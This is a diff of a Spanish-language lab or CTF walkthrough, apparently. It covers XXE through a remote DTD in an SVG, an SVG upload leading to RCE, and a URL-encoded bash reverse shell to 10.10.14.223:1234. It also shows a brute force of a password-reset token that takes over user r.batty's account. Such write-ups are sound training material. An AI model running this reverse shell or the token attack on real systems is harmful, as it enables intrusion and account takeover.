@@ -297,13 +297,13 @@ Se construyó un archivo SVG que referencia el DTD remoto y&#x20;fuerza la reso
 <svg>&content;/svg>
 ```
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>
 
 decodificamos
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
 creamos una rev shell y la subimos&#x20;
 
@@ -316,11 +316,11 @@ version="1.1">
 </svg>
 ```
 
-<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
 
 se verifica el RCE
 
-<figure><img src="../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 vale hacemos la reverse shell
 
@@ -328,6 +328,32 @@ vale hacemos la reverse shell
 bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.223%2F1234%200%3E%261%22
 ```
 
-<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>
+
+## JOB PORTAL (8080)
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+VAMOS A LA FUNCIONALIDAD DE RESETEO DE CONTRASEÑA
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+CAPTURO PETICIÓN CON CAIDO
+
+<figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 120133.png" alt=""><figcaption></figcaption></figure>
+
+ATAQUE SNIPER AL TOKEN
+
+<div><figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 120602.png" alt=""><figcaption></figcaption></figure> <figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 120543.png" alt=""><figcaption></figcaption></figure></div>
+
+<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+ingresamos ya el token con la nueva contraseña de r.batty e iniciamos sesión con esas credenciales
+
+<figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 120830.png" alt=""><figcaption></figcaption></figure>
+
+### task 5
+
+<figure><img src="../.gitbook/assets/Captura de pantalla 2026-04-11 121050.png" alt=""><figcaption></figcaption></figure>
